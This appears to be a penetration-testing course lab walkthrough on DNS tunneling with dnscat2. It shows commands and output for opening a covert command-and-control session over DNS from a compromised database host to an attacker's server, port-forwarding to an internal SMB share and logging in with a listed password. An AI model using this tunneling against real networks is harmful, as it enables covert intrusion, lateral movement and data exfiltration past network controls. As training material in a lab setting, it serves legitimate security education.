# DNS Tunneling with dnscat2

Starting tcpdump to listen for packets on UDP port 53
>``` shell
>kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
>
># ========== Expected Result ==========
>[sudo] password for kali: 
>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
>listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
># =====================================
>```

Starting the dnscat2 server
>``` shell
>kali@felineauthority:~$ dnscat2-server feline.corp
>
># ========== Expected Result ==========
>New window created: 0
>New window created: crypto-debug
>Welcome to dnscat2! Some documentation may be out of date.
>
>auto_attach => false
>history_size (for new windows) => 1000
>Security policy changed: All connections must be encrypted
>New window created: dns1
>Starting Dnscat2 DNS server on 0.0.0.0:53
>[domains = feline.corp]...
>
>Assuming you have an authoritative DNS server, you can run
>the client anywhere with the following (--secret is optional):
>
>  ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp
>
>To talk directly to the server without a domain name, run:
>
>  ./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7
>
>Of course, you have to figure out <server> yourself! Clients
>will connect directly on UDP port 53.
>
>dnscat2>
># =====================================
>```

The dnscat2 client running on PGDATABASE01
>``` shell
>database_admin@pgdatabase01:~$ cd dnscat/
>
>database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
>
># ========== Expected Result ==========
>Creating DNS driver:
> domain = feline.corp
> host   = 0.0.0.0
> port   = 53
> type   = TXT,CNAME,MX
> server = 127.0.0.53
>
>Encrypted session established! For added security, please verify the server also displays this string:
>
>Annoy Mona Spiced Outran Stump Visas 
>
>Session established!
># =====================================
>```

The connection coming in from the dnscat2 client
>``` shell
>kali@felineauthority:~$ dnscat2-server feline.corp
>
># ========== Expected Result ==========
>[sudo] password for kali: 
>
>New window created: 0
>New window created: crypto-debug
>Welcome to dnscat2! Some documentation may be out of date.
>
>auto_attach => false
>history_size (for new windows) => 1000
>Security policy changed: All connections must be encrypted
>New window created: dns1
>Starting Dnscat2 DNS server on 0.0.0.0:53
>[domains = feline.corp]...
>
>Assuming you have an authoritative DNS server, you can run
>the client anywhere with the following (--secret is optional):
>
>  ./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp
>
>To talk directly to the server without a domain name, run:
>
>  ./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944
>
>Of course, you have to figure out <server> yourself! Clients
>will connect directly on UDP port 53.
>
>dnscat2> New window created: 1
>Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
>For added security, please ensure the client displays the same string:
>
>>> Annoy Mona Spiced Outran Stump Visas
>
>dnscat2>
># =====================================
>```

Lots of DNS queries made to feline.corp, as seen in tcpdump
>``` shell
>...
>07:22:14.732111 IP 192.168.50.64.51077 > 192.168.118.4.domain: 29066+ [1au] TXT? 8f150140b65c73af271ce019c1ede35d28.feline.corp. (75)
>07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT "b40d0140b6a895ada18b30ffff0866c42a" (111)
>07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
>07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
>07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME? 38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
>07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
>07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
>07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX 385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
>07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX? 68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
>07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)
>07:22:17.407889 IP 192.168.50.64.50621 > 192.168.118.4.domain: 39215+ MX? cd6f0158e082e5562128b71e1353f111be.feline.corp. (64)
>07:22:17.408397 IP 192.168.118.4.domain > 192.168.50.64.50621: 39215 1/0/0 MX 985d0158e00880dad6ec05ffff57240ba6.feline.corp. 10 (126)
>07:22:17.762124 IP 192.168.50.64.49720 > 192.168.118.4.domain: 51139+ [1au] TXT? 49660140b6509f242f870119c47da533b7.feline.corp. (75)
>07:22:17.762610 IP 192.168.118.4.domain > 192.168.50.64.49720: 51139 1/0/0 TXT "8a3d0140b6b05bb6c723aeffff0866c42a" (111)
>07:22:18.417721 IP 192.168.50.64.50805 > 192.168.118.4.domain: 57236+ TXT? 3e450158e0e52d9dbf02e91e1492b9d0c5.feline.corp. (64)
>07:22:18.418149 IP 192.168.118.4.domain > 192.168.50.64.50805: 57236 1/0/0 TXT "541d0158e09264101bde14ffff57240ba6" (111)
>07:22:18.772152 IP 192.168.50.64.50433 > 192.168.118.4.domain: 7172+ [1au] TXT? d34f0140b6d6bd4779cb2419c56ad7d600.feline.corp. (75)
>07:22:18.772847 IP 192.168.118.4.domain > 192.168.50.64.50433: 7172 1/0/0 TXT "17880140b6d23c86eaefe7ffff0866c42a" (111)
>07:22:19.427556 IP 192.168.50.64.50520 > 192.168.118.4.domain: 53513+ CNAME? 8cd10158e01762c61a056c1e1537228bcc.feline.corp. (64)
>07:22:19.428064 IP 192.168.118.4.domain > 192.168.50.64.50520: 53513 1/0/0 CNAME b6e10158e0a682c6c1ca43ffff57240ba6.feline.corp. (124)
>07:22:19.782712 IP 192.168.50.64.50186 > 192.168.118.4.domain: 58205+ [1au] TXT? 8d5a0140b66454099e7a8119c648dffe8e.feline.corp. (75)
>07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT "2b4c0140b608687c966b10ffff0866c42a" (111)
>07:22:20.438134 IP 192.168.50.64.65235 > 192.168.118.4.domain: 52335+ CNAME? b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
>07:22:20.438643 IP 192.168.118.4.domain > 192.168.50.64.65235: 52335 1/0/0 CNAME c0330158e07c85b2dfc880ffff57240ba6.feline.corp. (124)
>07:22:20.792283 IP 192.168.50.64.50938 > 192.168.118.4.domain: 958+ [1au] TXT? b2d20140b600440d37090f19c79d9f6918.feline.corp. (75)
>...
>```

Interacting with the dnscat2 client from the server
>``` shell
>dnscat2> windows
>
># ========== Expected Result ==========
>0 :: main [active]
>  crypto-debug :: Debug window for crypto stuff [*]
>  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
>  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
># =====================================
>
>dnscat2> window -i 1
>
># ========== Expected Result ==========
>New window created: 1
>history_size (session) => 1000
>Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
>For added security, please ensure the client displays the same string:
>
>>> Annoy Mona Spiced Outran Stump Visas
>This is a command session!
>
>That means you can enter a dnscat2 command such as
>'ping'! For a full list of clients, try 'help'.
>
>command (pgdatabase01) 1> ?
>
>Here is a list of commands (use -h on any of them for additional help):
>* clear
>* delay
>* download
>* echo
>* exec
>* help
>* listen
>* ping
>* quit
>* set
>* shell
>* shutdown
>* suspend
>* tunnels
>* unset
>* upload
>* window
>* windows
>command (pgdatabase01) 1>
># =====================================
>```

Information on the listen command
>``` shell
>command (pgdatabase01) 1> listen --help
>
># ========== Expected Result ==========
>Error: The user requested help
>Listens on a local port and sends the connection out the other side (like ssh
>	-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
>  --help, -h:   Show this message
># =====================================
>```

Setting up a port forward from FELINEAUTHORITY to PGDATABASE01
>``` shell
>command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
>
># ========== Expected Result ==========
>Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
># =====================================
>```

Connecting to HRSHARES's SMB server through the dnscat2 port forward
>``` shell
>kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
>
># ========== Expected Result ==========
>Password for [WORKGROUP\hr_admin]:
>
>        Sharename       Type      Comment
>        ---------       ----      -------
>        ADMIN$          Disk      Remote Admin
>        C$              Disk      Default share
>        IPC$            IPC       Remote IPC
>    	scripts         Disk
>        Users           Disk      
>Reconnecting with SMB1 for workgroup listing.
>do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
>Unable to connect with SMB1 -- no workgroup available
># =====================================
>```

Lab 1 - Follow the steps in this section to set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01. Download the dnscat_exercise_client from the Resources section ro your Kali machine. If you're running the aarch64 build of Kali, download the dnscat_exercise_client_aarch64 binary instead. Set up a port forward with dnscat2 which allows you to run the binary against the server running on port 4646 on HRSHARES.
>``` shell
>
>```
>
